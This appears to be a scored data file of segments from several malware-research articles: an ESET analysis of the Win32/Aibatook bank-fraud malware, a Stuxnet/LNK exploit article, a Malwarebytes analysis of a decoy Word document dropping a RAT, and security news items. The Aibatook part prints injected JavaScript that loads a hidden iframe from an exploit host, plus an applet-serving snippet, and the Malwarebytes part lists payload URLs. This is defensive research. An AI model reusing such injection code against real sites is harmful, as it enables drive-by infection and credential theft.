"The Win32/Aibatook bank fraud malware’s story starts, as usual nowadays, with legitimate websites that have been compromised to redirect their visitors to exploit-serving machines in order to infect them with malicious software. But rather than using a full-fledged exploit kit – such as Fiesta, Angler or any other of the usual suspects, which are able to serve different exploits depending on the visitor’s configuration – the miscreants behind Win32/Aibatook infections employ only one exploit at a time. While it could appear to be a non-optimal strategy, it is actually coherent with the targeted nature of this whole operation. If you possess an efficient exploit against your target – Japanese bank customers in this case – why would you bother using more?",0.011039197171153758
"Since mid-April, the exploit used to propagate Win32/Aibatook uses the Java vulnerability CVE-2013-2465. In order to do so, several compromised legitimate websites have been used. Over the last three months, we identified four of these websites (and we believe there are more) – these domain names are listed below:",0.009091715374411113
"sokuhabo.net
www.uravidata.com
ppv.xxxurabi.com
mywife.cc",0.011739447966878869
"These four websites provide pornographic content aimed at a Japanese audience. According to Alexa, three of them belong to the 20,000 most visited websites from Japan; “mywife.cc” is even part of the first 2,000. It remains unclear how the attackers compromised these websites.",0.012243046948143488
The image below describes the exploitation process in the particular case of “ppv.xxxurabi.com” (the others three websites follow similar exploitation logic):,0.007423269692129475
"1. The user browses to a webpage on “ppv.xxxurabi.com“, which includes a link to a malicious JavaScript (JS) file hosted on “google.sonovi.com“, another compromised website.",0.008882956247714402
"2. Once a first layer of basic obfuscation has been removed, this script has the following form:",0.010338010017392096
"if(document.cookie.indexOf(“GOOGLE1”)==-1)
{",0.017405813907822587
"var _d=new Date();
_d.setTime(_d.getTime()+24*60*60*1000);
document.cookie=”GOOGLE1=123GOOGLE1456;expires=”+_d.toGMTString();
setTimeout(",0.016639280321835925
"function(){
var _ifr=document.createElement(/ifra/.source+/me/.source);
ifr.width=”1″;
ifr.height=”1″;
ifr.frameborder=”0″;
ifr.src=”//2002.jp/”;
document.body.appendChild(_ifr)},
1000)",0.016008941685742073
},0.008910712288718647
"The script injects an IFRAME to an exploit-serving webpage “2002.jp”. It also sets a Cookie named “GOOGLE1” that will stay on the user’s computer during the next 24 hours, such that no additional redirects occur during this time-frame.",0.008157309697016113
"3. Then the user connects to the exploit-serving website, which replies with what looks like an error page:",0.012231581616350629
Under certain conditions a snippet of HTML code – invisible to the user — will be inserted at the very beginning of the page. It is highlighted in blue in the following page source below:,0.011285836995550746
"<HTML>
<BODY>
<applet id=”HelloApplet” code=”b399.class”,height=”0″ width=”0″></applet>
</BODY>
</HTML><script src=”//ccc.rejec.net/counter.php”></script>
<html>
<head>
<title>Error 404 Not Found</title>
…",0.008547484811427308
"The browser will then download the Java applet “b399.class” from the website and execute it. It will also request a file named “counter.php” on another domain. We believe this last step is related to the conditions under which the HTML snippet will be inserted: only a limited number of users per day will receive the exploit, explaining the need to count the number of tries. This counter script is hosted on what appears to be yet another compromised website, “ccc.rejec.net”.",0.008559236663126968
"4. The Java applet is an exploit for the vulnerability CVE-2013-2465. Roughly summarized, it starts with an integer overflow in a 2D component of Java SE that leads to a memory corruption in the Abstract Window Toolkit (AWT) code. This memory corruption allows the bypass of the Java sandbox through the rewrite of the “SecurityManager” class. The exploit will then download the payload from the URL provided by one of the class files, save it as “tar.gif”, and finally execute it. The payload URL was “xsvx1014274.xsvr.jp” during our investigation.",0.00606391492130498
The various class files that we observed as part of this exploit are described below:,0.007336838979290938
"SHA-1 Hash
File Name
Purpose",0.01066666952591555
"56ba51304da919b71833520dece8ca3c644011d3 49b0699acf7682084b4cde88a3af6d1c1b7c0c09
b399.class
Manages the exploitation",0.007645934892586248
"2ca6c1a0cf118ff7beb14453da4875b59d8084e0
a1bd.class
Defines malicious AWT subclass",0.007765438346718168
"9f9627dae3adfeac8ecbd8698fc0f5da22f79d70
Af.class
Returns the URL of the file to download",0.007263697641247013
"8fb90f496367112049eb8dafb518b98945b0b9ec
HttpGet.class
Fetches a file at a given URL and executes it",0.006710946407015861
"We would like to stress the fact that Win32/Aibatook was distributed through other exploits at different periods of time (e.g. CVE-2014-0322), but always in this “one exploit at a time” configuration according to our observations.",0.00869393992796541
Payload,0.009121200219477266
"Win32/Aibatook’s main objective is to steal personal and banking information from Japanese users. This comes in two different flavors: firstly, a few banks are targeted in a tailored manner, and secondly, around 90 different websites are targeted through a more generic method. Both these methods rely on the same Internet Explorer manipulation technique, which we are now going to describe.",0.011313895919458639
Internet Explorer Manipulation,0.008420943609304565
"Win32/Aibatook controls Internet Explorer through the COM interface “IHTMLDocument2”, which allows easy reading and writing of webpages with high-level methods. To retrieve this interface for the currently browsed webpage, Win32/Aibatook performs the following steps:",0.013451599561614236
"Retrieve a handle on the window under the mouse cursor using “GetCursorPos” and “WindowFromPoint” API functions
Check whether that window’s class name is “Internet Explorer_Server”:",0.009531958719830258
"If it is not, the program simply sleeps for one second before retrying
If it is, the “IHTMLDocument2” interface is instantiated from the window’s handle, using a documented technique",0.014051732509148374
"Such Internet Explorer-specific implementations – which work from versions 8 to 11 at least – can seem pretty limited, because no other browsers can be manipulated. However, Japan is one of the few countries where Internet Explorer is the most-used browser. This is another indicator of Win32/Aibatook’s Japanese-only focus.",0.008808484230207303
"The next two sections present the attacks used by Win32/Aibatook, respectively denoted “Tailored Information Stealer” and “Generic Information Stealer”.",0.016947461685125842
Tailored Information Stealer,0.009726675314225885
"In the first application of the Internet Explorer monitoring technique, Win32/Aibatook targets a few banks whose URLs are hardcoded into the program. During our investigation, we observed Japan Post and the SBI Sumishin Net Bank as targets. In order to attack these banks, Win32/Aibatook extracts the URL of the currently visited webpage, using the “IHTMLDocument2.get_url” method, and compares it with the targeted banks’ URLs:",0.012341577237559354
"It should be noted that the banks’ URLs are encrypted with a custom cipher, as are all the malicious strings present in Win32/Aibatook samples. More precisely, each encrypted string is composed of two parts:",0.014236780482757005
"The first one is a fixed-length key that looks like a base64 encoded string, but that is actually just random base64 characters. Before being used, this key will be XOR-ed with a hardcoded value.
The second part contains the encrypted data that will be base64 decoded first, and then XOR-ed with the previous key.",0.015710060445571106
"In case it is one of the targeted banks’ URLs, the malicious program will monitor the user login process based on the title of the page (“IHTMLDocument2.get_title”) and its content (“IHTMLDocument2.get_nameProp”). During this login process, Win32/Aibatook can do two things:",0.01395891390839521
"Retrieve values entered by the user in certain HTML input fields (login, password, and so forth.)
Rewrite HTML code displayed to the user by requesting the body of the HTML page (“IHTMLDocument2.get_body”) and modifying it (“body.put_innerHTML”). Here is an example of HTML code injected into the Japan Post bank login page:",0.011161226061280116
"The red message roughly translates as an urgent request for the user to type in their personal identification number, because a system upgrade is necessary (clicking on the button just redirects to another page on the Japan Post website). Once personal information has been gathered, the program sends it to the C&C server using a hardcoded URL. This message is a HTTP POST request containing the grabbed information as parameters, encrypted in a similar manner as the strings previously mentioned. It also sends the MAC address of the machine, probably to identify the victim. Among the two targeted banks with this method, Japan Post – targeted by Win32/Aibatook since the beginning – receives special treatment:",0.011658378775556977
"A malicious proxy is set in the web browser when the user visits the Japan Post website. We were unable to observe the usage of this proxy, but we can guess it is another way to collect the information entered by the user.
If the user visits an anti-phishing webpage on the Japan Post website, Win32/Aibatook redirects to the login page before the anti-phishing webpage can be loaded.",0.009569190874270106
Generic Information Stealer,0.008004910590251435
"Last April, an additional information-stealing technique appeared in Win32/Aibatook. It allows attackers to extend the number of targets greatly without too much effort, even targeting non-banking websites. During the last few months this technique has been refined and seems recently to have reached a satisfying level – at least from the Win32/Aibatook authors’ point-of-view – as they are now only modifying the content and not the capabilities of the configuration engine.",0.013844937871236862
"This technique, commonly named ‘form-grabbing’, consists of constantly monitoring HTML input fields in webpages browsed by the user. In case these input fields match certain conditions, their filled values will then be exfiltrated. In order to so, a configuration file describing the target websites is fetched from a hardcoded URL. This file is initially encrypted in a similar manner to the strings described before, and will then be stored in memory in plain-text form. Here is an excerpt of one particular configuration file we found:",0.01263878748201952
"[VER]1000[/VER]
[W]",0.008985550542114473
"[Web]xy40[/Web]
[CURL]REDACTED.jp[/CURL]
[CTI][/CTI]
[NAME]memberid[/NAME]
[NAME]password[/NAME]
[NAME]domain[/NAME]",0.01003497443879442
"[/W]
[W]
…
[/W]",0.008734962035700122
"It’s a structured file with hierarchical tags similar to HTML language, except that tags are enclosed in brackets. It starts with a version tag, followed by a series of “[W]” entries, each of them representing a target and containing multiple sub-entries:",0.014096111107493425
"“[Web]” tag contains the target’s name, which is usually set to some kind of code name with no apparent meaning
“[CURL]” tag contains the target webpage’s URL (target’s URL has been removed from the previous image)
“[CTI]” tag contains the target webpage’s title
”[NAME]” tag defines an HTML input field’s name that will be leaked
“[ID]” tag defines an HTML input field’s ID that will be leaked",0.01376936100266457
"The logic followed by the program with this configuration file is the following: if a website’s URL matches the “[CURL]” tag value of one entry, or its title matches the “[CTI]” value tag, then each HTML input field that matches either “[NAME]” or “[ID]” tag values will be exfiltrated. To make it clear, let’s take a look at an artificial example:",0.01424197247984349
"Win32/Aibatook configuration
Page visited by the user at the URL http://my_bank.demo/login/  step2.html
Exfiltrated data when the user has filled the input fields with the values “MY_NAME” and “SECRET_PASSWORD”",0.007068183165924613
"[W]
[Web] CONFIG_DEMO [/Web] [CURL][/CURL] [CTI][/CTI] [NAME] user_name [/NAME] [ID] user_password [/ID]
[/W]",0.009267009392126768
"<html> <title>STEP 2</title> <form> User name: <input type=”text” name=”user_name”> Password: <input type=”text” id=”user_password”> </form> </html>
[WEB]CONFIG_DEMO[/WEB] [TITLE]STEP 2[/TITLE] [URL]http://my_bank.demo/ login/step2.html[/URL] [NAME=user_name]MY_NAME [/NAME] [ID=user_password] SECRET_PASSWORD[/ID]",0.011675852996178238
"In this example we have, from left to right, a Win32/Aibatook’s configuration file with one entry, then a visited webpage that will trigger this entry, and finally the information sent to the exfiltration server. This information-stealing technique is highly flexible; in particular some entries come with empty values for “[CURL]” and “[CTI]” tags, making any webpage with the corresponding HTML input fields a match. In terms of targets, we found 87 of them during our investigation. We were able to identify some of them, based on the “[CURL]” and “[CTI]” tags values, whereas the others remain unidentified. The domains of activity of these targets are described below:",0.012678378257267475
"Domains of activity
Number of targets",0.00989491588845448
"Bank
23",0.008811323820296146
"Hosting Provider
5",0.0074544011738657545
"Domain reseller
1",0.009208779894097963
"Unidentified
58",0.012418966416302246
"As expected, the majority of the identified targets belong to the banking domain, but some of them are hosting companies, which could explain how legitimate websites are compromised and then used in the exploitation chain. It should be noted that the majority of the identified targets are important businesses in Japan.",0.013822598573804967
Conclusion,0.008171308922719556
"In this blog post we have described Win32/Aibatook, a malware family targeting Japanese users. Computers become infected by this malware through a custom exploitation chain served by compromised legitimate websites. Its main purpose is to steal personal information through an unusual Internet Explorer monitoring technique. This technique implements two different information stealers, one specifically tailored against a few major Japanese banks, and a second one targeting around 90 different websites.",0.013942009630091956
"Based on our observations during this investigation, Win32/Aibatook has been constantly developed over the past few months. We believe that this malware family is now ready for take-off, and we expect its authors to spread it more broadly in the near future.",0.01180609198404281
"This analysis was created by Clément Rouault, in collaboration with Joan Calvet.",0.01382098354146688
Hashes,0.008943721272284266
Here are some SHA-1 hashes of Win32/Aibatook samples:,0.008243856218890566
"c5ffed550addfa27dc1adbc58f3f99fa9a5bc9e8
ebd4fd477bd8a93bfb24fd49128860e8d2b494e0
3e90dde02423687b7c81cba8fc600f7cbcda8752
4343919ba7c2701f5481632f20bf7ddc2c6ebe11
",0.014381801666740746
"Chim Chymine: a lucky sweep?
2010-09-01",0.012397300410313616
"David Harley
ESET
,
UK
Editor:
Helen",0.010721387387928272
"Martin
Abstract
Apart from generating detection for Stuxnet, ESET also started to detect its approach heuristically and it wasn't long before new malware families appeared, experimenting with LNK files. David Harley has the details.
Copyright © 2010 Virus Bulletin",0.013377600176687321
"The class of malware that exploits Autorun/Autoplay as an infection vector has been an irritating fact of life for a good while. The malware known as Win32/Stuxnet could be (and indeed has been [1]) described as a worm of a different colour. It can propagate making use of a zero-day vulnerability [2] listed by CVE as CVE-2010-2568 [3]. In a nutshell – or rather the Windows Shell – Windows can be tricked into executing malicious code presented in a specially crafted shortcut (.LNK) file, linking in turn to a malicious DLL, allowing compromise of a system even where Autoplay is disabled. (It should not be forgotten that USB devices aren’t the only potential entry point: network and webDAV shares are also an issue.)",0.008171920176778258
"Missing links
There’s already plenty of detailed information available on both the vulnerability and the very interesting Win32/Stuxnet family, so I won’t go much beyond the minimum background in this article. However, apart from generating detection for Stuxnet, ESET also started to detect its approach heuristically, as LNK/Autostart.A, and subsequently as LNK/Exploit.CVE-2010-2568. It was, after all, reasonable to suppose that as the proof-of-concept code gained currency, other malware families would adopt the same trick. Sure enough, our telemetry systems soon picked up some interesting vibes.",0.015568396194459488
"The other VB
As early as 20 July, our lab was seeing several Autorun worms written in Visual Basic and experimenting with LNK files. However, by 23 July things were getting really interesting. We had identified a new family exploiting the still unpatched vulnerability in order to spread by code execution through malicious LNK files. This was promptly christened Win32/TrojanDownloader.Chymine.A. At the present time, this threat is used to download and install a keystroke logger which we detect as the Win32/Spy.Agent.NSO trojan.",0.012037612148848797
"China Chymine in
The server used to deliver the components used in this attack is presently located in the US, hosted by the ‘Managed Solutions group’. According to RWHOIS data from the hosting organization, the server IP address was assigned to a customer in China on 22 July. The DLL downloaded from here contains a number of strings in Chinese, translated here courtesy of Google Translate:
Comment: ‘Fire Personal Firewall, building a fun-filled safe network for you’
File description: Fair Personal Firewall, for you to create a safety net is full of fun.
Company name: Fair Safety Laboratory
Product name: Fair Personal Firewall
At the time of writing, neither Chymine.A nor any of the related files seem to be generating any malicious LNK files themselves. To date, we’ve only found LNKs exploiting the latest vulnerability and pointing to the downloader, suggesting to us that since Chymine.A doesn’t spread by itself, there must be something (or someone) else ‘helping’ it along [4].",0.009520460940554809
"This will (Auto)run and run
Even while the lab team was in the process of sharing information about this new threat with other researchers, they observed a known threat which had been refurbished to include the CVE-2010-2568 exploit as a new propagation vector. Win32/Autorun.VB.RP looks very much like an updated version of the malware written in Visual Basic and described on 21 July by Adrian de Beaupre [5]. This class of threat hides folders in the root directory of any drive to which it has Write access, creates LNKs with the same name as the hidden folders, and drops autorun.inf, EXE and SRC files. It differs from the Internet Storm Center description, however, in that it does actually produce new LNK files exploiting the CVE-2010-2568 vulnerability to facilitate its own spreading; it doesn’t simply rely on Autorun or wait for the victim to click on a malicious but uncrafted LNK. It now seems to download and install additional components on infected machines. The LNKs making use of the CVE-2010-2568 exploit use the following naming convention: z<two letters>.lnk (for example ‘zTa.lnk’).
There’s not much doubt about which of the present crop of malware based on the original LNK vulnerability is the most novel and interesting. Win32/Stuxnet has two major points of interest.
One, of course, is the targeting of Siemens control software on SCADA sites, injecting modules SystemRoot\inf\oem7A.PNF and SystemRoot\inf\oem7A.PNF into the address spaces of CCprojectMgr.exe and S7tftopx.exe processes using the mrxcls.sys driver, and reading configuration information from the registry key ‘HKLM\System\CurrentControlSet\Services\MRxCLS. (This may account for some of the interesting distribution patterns that have been noted by some sources [1], [6].)
The second point of interest is Stuxnet’s use of legitimate digital certificates to sign its device driver. These were stolen from Realtek and JMicron Technology Corp [7] and were subsequently revoked by VeriSign in order to prevent further misuse [8], [9], [10].",0.012044871217553155
"The early bird lays the worm?
However, the newer malware we’re seeing is far less sophisticated than Stuxnet, and suggests bottom feeders seizing on vulnerabilities flagged by others, and hijacking exploitative techniques developed by the early birds. This is interesting in its own way (not least for the speed with which it has appeared). We expect to see plenty more worm cast [11] on the beach before (and after) Microsoft’s update [12] appears on the horizon.
This article synthesizes the research and thoughts of many people, not only within ESET but in the anti-malware community at large, and too many to mention individually. However, particular thanks are due to Richard Baranyi, Peter Košinár, Juraj Malcho, Pierre-Marc Bureau and Aleksandr Matrosov for sharing their research data and insights.",0.010936662659406404
"Bibliography
[1] http://blog.eset.com/2010/07/17/windows-shellshocked-or-why-win32stuxnet-sux.
[2] http://www.microsoft.com/technet/security/advisory/2286198.mspx.
[3] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568.
[4] http://blog.eset.com/2010/07/22/new-malicious-lnks-here-we-go.
[5] http://isc.sans.edu/diary.html?storyid=9229.
[6] http://blogs.technet.com/b/mmpc/archive/2010/07/16/the-stuxnet-sting.aspx.
[7] http://blog.eset.com/2010/07/19/win32stuxnet-signed-binaries.
[8] https://blogs.verisign.com/ssl-blog/2010/07/code_signing_certificates_used.php.
[9] http://blog.eset.com/2010/07/22/why-steal-digital-certificates.
[10] Goretsky, A. http://blog.eset.com/2010/07/22/a-few-facts-about-win32stuxnet-cve-2010-2568.
[11] http://en.wikipedia.org/wiki/Worm_cast.
[12] http://www.microsoft.com/technet/security/advisory/2286198.mspx.
",0.012353249877069095
"Decoy Microsoft Word document delivers malware through a RAT
In this post, we take a look at a Microsoft Word document which itself is somewhat clean, but is used to launch a multi-stage attack that relies on the hyperlink feature in the OpenXML format. This then loads another document that contains an exploit.
Most malicious Microsoft Office documents involve either macros, embedded scripts, or exploits and are typically delivered via email. In this case, the unsuspecting user opening the decoy Word document will trigger an automatic (no click or interaction required) download of a malicious RTF file that deploys an exploit (CVE-2017-8759), which ends up distributing the final malware payload.
The several-step removed payload is a commercial Remote Administration Tool that, in this case, is used for nefarious purposes. Victims will be none-the-wiser as the infection process happens in the background, while their Word document finally loads what looks like legitimate content.
While attackers could have sent the exploit-laced document first, that might have triggered detection and quarantine at the email gateway. Instead, the benign document acted as a kind of Trojan horse that made its way to the end user’s desktop, where it would finally show its real intent.
The diagram below summarizes the different steps that this attack takes, from the original document all the way to the malware payload.",0.011084603056132347
"Initial package
The initial document was reported by @xme on Twitter. A quick check using oletools indicates that the file has the OpenXML format and no macros.
FILE: Product Description.docx
Type: OpenXML
No VBA macros found.
Since OpenXML files are archives, they can be decompressed to reveal their content.
[CONTENT_TYPES].XML
_RELS/.RELS
WORD/_RELS/DOCUMENT.XML.RELS
WORD/DOCUMENT.XML
WORD/MEDIA/IMAGE1.EMF
WORD/THEME/THEME1.XML
WORD/SETTINGS.XML
WORD/WEBSETTINGS.XML
WORD/STYLESWITHEFFECTS.XML
DOCPROPS/CORE.XML
WORD/STYLES.XML
WORD/FONTTABLE.XML
DOCPROPS/APP.XML
Opening document.xml.rels reveals an interesting external URL, pointing to another document.",0.010206102306154263
"The relationship with Id=”rID6″ is loaded by the main document.xml file. If we open the document without network connectivity (to prevent the automatic execution), we can spot where this object is located.",0.007303127350675509
"The actual exploit: CVE-2017-8759
The remote file saqlyf.doc is downloaded and opened by Product Description.docx into the Temporary Internet Files folder.",0.008071745064518132
"This time, it is an RTF file.",0.015129891770843895
"After we convert the hexadecimal encoding to binary (oledump), we can spot another interesting URL.",0.012094026302227667
"At this point, we could be looking at CVE-2017-0199 if the server provided a MIME type response of application/hta. But in this case, we have something different, and we can quickly spot the SOAP-related bug associated with CVE-2017-8759.",0.008159554912087197
The above code will parse and execute the content of the oghujp.hta file pictured below.,0.009036436566596362
"The nasty bit is encoded with ChrW but we can let VBScript do the work and output what it is in human, readable terms.",0.013216867556125056
"This is the final part of the exploitation phase, and it involves running PowerShell to download and run a binary.
Attack payload: a RAT
This attack was meant to install a commercial Remote Administration Tool known as Orcus Rat, which as seen previously was also hosted on the same server containing the exploit. The program is written in .NET and contains functions such as keylogging, remote desktop, or access to the webcam.",0.01237071640898657
The file is concealed as mozilla.exe and periodically checks with its command and control infrastructure.,0.011284269170752537
"While commercial RATs can be used for legitimate purposes, malicious actors often abuse them for their own sinister goals.
Diversion
Part of the malicious VBScript creates a fake document on the fly that is displayed to the user. If you look carefully, you will notice that the file is called Document1, therefore it’s an additional file to the original Product Description.docx one. It also contains too many typos (but that’s a debate for another day).",0.014346117663041724
"Attack infrastructure
The exploit and payload used in this attack are served from a free file hosting site at pomf[.]cat.",0.010436500212546718
A cursory look at the site revealed that many other malicious files are also hosted on this platform. We have reached out and requested a takedown of the offending files.,0.012573598683911391
"Protection
This type of attack relies on a little bit of social engineering to trick the user into opening a Word document, while the rest is handled by an exploit that was patched just a month ago. It’s quite likely many machines out there are still vulnerable if those updates have not been applied in a timely fashion.
Scanning for the original document at the gateway may not have returned anything due to its relatively benign nature, and this is why protection at the end point is so important. More and more attacks these days are modular and retrieve payloads on the fly in order to evade detection.
Malwarebytes users are already protected against this exploit. Additionally, we detect the RAT as Backdoor.NanoCore.",0.014323739594557572
"Indicators of compromise
Initial document (Product Description.docx)
01e45e5647f103ccc99311066d0625f24e79ec8462b131d026b7a557a18d7616
RTF (CVE-2017-8759)
a.pomf.cat/saqlyf.doc
5758c31928c5f962fbb3ec2d07130e189a8cf4f3fbd0cd606cb1c1d165334a1c
PNG (CVE-2017-8759)
a.pomf.cat/uczmbn.png
5ed4582313d593a183ab0b8889dc3833c382ce9ca810287d0fcf982275b55e60
HTA (CVE-2017-8759)
a.pomf.cat/oghujp.hta
b048a2d2ea3bb552ac6e79e37fc74576a50c79b4d8c9fd73b1276baabc465ebf
Payload (RAT)
a.pomf.cat/aqzhnk.exe
72041b65777a527667e73ccc5df95296f182e4787f4a349fcbe0220961dd0ed2
",0.015089406421919471
"A Week in Security (Oct 11 – Oct 17)
Last week, we touched on Mozilla’s add-on guidelines for the Firefox browser; questioned the possibility of adware using the popular compression program, 7-Zip; and for our PUP Friday post, revealed a hijacker that installs its own browser, replacing Chrome if found installed on the affected system.
Senior security researcher Jérôme Segura wrote about the latest Adobe Flash Player 0-day vulnerability that had been in-the-wild at the time of reporting. The flaw was originally found and reported by a Google engineer a couple of weeks before it was found being used in targeted attacks. Users were advised to update to the latest version, 19.0.0.226, as a way to fix this.
Segura also documented data from our telemetry, detecting a malvertising attack happening within the online news outfit, the Daily Mail. Although news claimed that the attack was brief, users who visited the site may have been affected by the Angler exploit kit if their systems were not properly patched.
Notable news stories and security related happenings:",0.010977893692122986
"US Ports – Cyber Attacks can Cause the Release of Dangerous Chemicals. “The Rep. Candice Miller, R-Mich explained that a cyber attack against a US port could cause serious damage to populated areas thanks to security gaps left unfixed by the Department of Homeland Security. According to the congressman, the security issues were reported more than a year ago by the Government Accountability Office, but the DHS hasn’t taken the necessary steps to fix them.” (Source: Security Affairs)
Boffin’s Easy Remote Hijack Hack Pops Scores of Router Locks. “Thousands of routers mandated for use by a major Singaporean telco and operated by ‘top enterprises” around the world are open to a remote zero day exploit that allows routers to be completely hijacked and is indefensible by most users. Vantage Point Security senior security consultant Lyon Yang does not wish to disclose the name of the affected internet provider but says the ZHONE routers are required for subscribers to be able to connect to the service.” (Source: The Register)
Japan’s Cybercrime Underground On The Rise. “Researchers at Trend Micro’s Forward Looking Threat Research team studied the inner workings of Japan’s cybercrime activity, and found some interesting characteristics. Japan is still a newbie here, and the bad guys have a higher bar to clear given the nation’s strict criminal laws. So Japan’s cybercriminals don’t write their own malware due to the tight legal environment against such activity there; they instead buy malware from their counterparts in other nations.” (Source: Dark Reading)
European Aviation Body Warns of Cyber-attack Risk Against Aircraft. “Over the past two years, there has been an increasing number of cyber-security incidents reported in the aviation industry. As reported by French newspaper Les Echoes, Ky said the white-hat hacker, who was also a professional pilot, took five minutes to crack the messaging system. It was another couple of days before the same consultant managed to gain access to aircraft control systems. As reported by French newspaper Les Echoes, Ky said the white-hat hacker, who was also a professional pilot, took five minutes to crack the messaging system. It was another couple of days before the same consultant managed to gain access to aircraft control systems.” (Source: SC Magazine)
Millennials Distrust Data Protection Methods Employed By Common Online Services: Study. “According to a survey released by Intercede, which polled millennials from both the United States and the U.K., members of the incumbent generation indicated they held low trustworthiness for many of the most commonly used online services. Sixty-one percent of respondents said they had “no” or “little” trust in social media platforms, 38 percent said the same for retailers and 22 percent for governmental services.” (Source: Legal Tech News)
‘One of World’s Largest Child Porn Distributors’ Captured in Colombia. “A 27-year-old man was caught with a stash of just under 85,000 videos, the largest repository of pornography ever found in Colombia, consumed illegally by pedophiles across the globe. The minors who appeared in the images and videos of the distributor’s external hard drives were in particular from Asia, Europe and Latin America.” (Source: Colombia Reports)
New Zero-Day Exploit Hits Fully Patched Adobe Flash. “Adobe officials have confirmed this vulnerability affects Flash version 19.0.0.207, which was released on Tuesday. The vulnerability has been cataloged as CVE-2015-7645. The company expects to release a fix next week.” (Source: Ars Technica)
Fraudsters Exploit Weak SSL Certificate Security to Set Up Hundreds of Phishing Sites. “Netcraft internet services developer Graham Edgecombe warned in a 12 October blog: ‘Consumers have been trained to “look for the padlock” in their browser before submitting sensitive information to websites, such as passwords and credit card numbers. However, a displayed padlock alone does not imply that a site using TLS (the successor to SSL) can be trusted, or is operated by a legitimate organisation.'” (Source: SC Magazine)
Even in Public Life, Some Things Should be Private. “Sunshine does not belong everywhere. Nor is it always helpful in a world too hasty to judge. Not convinced? Ask the family of Lord Brittan, who went to his grave knowing that millions thought he was guilty of a most disgusting crime. A little less openness would have been kinder – and more just.” (Source: The National)
Cops Don’t Need a Crypto Backdoor to Get Into Your Phone. “But despite the iPhone’s title as the highest-security smartphone—or even consumer-focused computer of any kind—it still offers significant cracks for the cops to exploit, says Nick Weaver, a security researcher at Berkeley’s International Computer Science Institute. ‘The iPhone is the hardest target, but in practice law enforcement can find a way in,” Weaver says. “There are three or four ways into the typical iPhone. It takes someone really paranoid to have closed all of them.'” (Source: Wired)
Uber Error Leaks US-based Drivers’ Data. “Uber has acknowledged that a flaw in its software caused it to leak personal data belonging to its drivers. The company said that about 700 of its “partners” in the US had been affected by the mistake. Exposed data included social security numbers, photos of driver licences, tax forms and other details, according to news site Motherboard, which first reported the issue.” (Source: The BBC)
Yahoo’s Attempt to Eliminate the Password. “…the company announced, users of the Yahoo Mail app on both iOS and Android will have access to a new service called Yahoo Account Key, which uses smartphones to verify identities in lieu of traditional passwords. When users who sign up for Account Key try to access Yahoo Mail, they will no longer need to enter their password. Instead, the Account Key service will send a message to the smartphone connected to the account.” (Source: IT News)
Universities Trying to Safeguard Sensitive Student, Parent Data. “Universities have been requiring and retaining students’ and parents’ sensitive financial and medical information for decades and are taking steps to safeguard it from hackers.” (Source: Business Insurance)
‘Legitimate’ Rooting Apps Paving Way for Malware. “Somewhere between 27 and 47 percent of all Android smartphones are rooted, said Qian. This allows users to get rid of pre-installed apps that are otherwise impossible to remove, to personalize their phones beyond what is allowed by the official limits, to get better backups, or better power management tools.” (Source: CSO Online)
The Evolving Landscape of “Hacking Back” Against Cyber Attacks. “Broadly speaking, ‘hacking back’ refers to attempts by cyber-attack victims to locate the perpetrator of the attack and, in some cases, identify and recover any information that may have been stolen by working backwards from the point of entry of the attack. Cyber security scholars have debated the effectiveness and propriety of such an approach.  Some liken hacking back to a justified response to a physical attack, while others compare it to vigilantism.” (Source: JD Supra)
Firms Pit Artificial Intelligence Against Hacking Threats. “Sometimes the best way to stop a bad machine is with a lot of good machines. Several companies are applying the techniques of artificial intelligence, or A.I., to the world of security, and they are using a whole bunch of machines strung together in so-called cloud computing networks to do it.” (Source: The New York Times)
Disney is Hiring an Intelligence and Counter-Terrorism Intern. “According to the job description, first reported by The Independent, the winning candidate will join the company’s ‘Counter Threat’ intelligence support team, which ‘provides strategic intelligence, threat assessments, vulnerability mitigation strategies and in-depth analytical products covering existing and developing threats that include counter terrorism, physical threats, cyber-attacks and all reputational risks to TWDC, its affiliated business units, facilities, guests and employees.'” (Source: Quartz)
Is Your Phone Safe for Work? “The most surprising finding in the report, he says, is the percentage of data breaches attributable to mobile devices. Nearly three-quarters of the 100 IT and security leads surveyed (about half of whom are chief information security officers) reported that their organizations have ‘experienced a data breach as a result of a mobile security issue.’ Common reasons for mobile data breaches? Malware-laden apps, security holes, and unsecured Wi-Fi connections, according to the study.” (Source: Fortune)
Prices of Stolen Data on the Dark Web. “Payment card data is perhaps the most well-known data type stolen and sold. McAfee Labs researchers found a value hierarchy in how this stolen data is packaged, priced and sold in the dark market. A basic offering includes a software-generated, valid number that combines a primary account number (PAN), an expiration date and a CVV2 number.” (Source: Help Net Security)
Malvertising is a Troubling Trend. “Over the past few weeks, my company’s employees have been hit by more than the usual number of malware infections. And the reason why is both startling and troubling, because these infections represent a new type of threat that is much harder to avoid than anything we’ve seen before.” (Source: Computer World)",0.013197806523497002
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
"According to independent sources, the author of the most popular web malware exploitation kit currently dominating the threat landscape, has recently issued yet another update to the latest version of the kit v1.2.2.",0.014744388927955043
"More details:
According to the independent reports, here’s what the latest update has introduced in the BlackHole exploit kit:",0.010624462953870206
"Java OBE + Java Rhino is now in a obedeny exploit Java Pack
Significantly improved otstuk through the Java hook
Your files are protected from AV companies pumping
Internal optimization of exploits",0.008277804360021457
"This is the second update issued for the exploit kit in recent months, following December 2011’s introduction of the CVE-2011-3544 exploit in the kit.
The BlackHole web malware exploitation kits is currently the most observed exploit kit currently used by cybercriminals, mostly due to the constant updates issued for the kit.
End users are advised to ensure that they’re not surfing the Web using outdated third-party applications, and browser plugins.
Webroot security researchers will continue monitoring the latest developments around the BlackHole exploit kit to ensure that Webroot SecureAnywhere customers are protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.013399497387427184
VB2014 paper: Apple without a shell – iOS under targeted attack,0.00800377060419355
2014-11-12,0.010269951427596347
Tao Wei,0.009209099414705602
"FireEye, Inc.
,
USA",0.010112601813233035
Min Zheng,0.009705171696877901
"FireEye, Inc.
,
USA",0.010112601813233035
Hui Xue,0.010204096583369182
"FireEye, Inc.
,
USA",0.010112601813233035
Dawn Song,0.009480563334360426
"FireEye, Inc.
,
USA",0.010112601813233035
"Editor:
Martijn",0.010420532582769537
Grooten,0.0074605631472147715
Abstract,0.009485057568311417
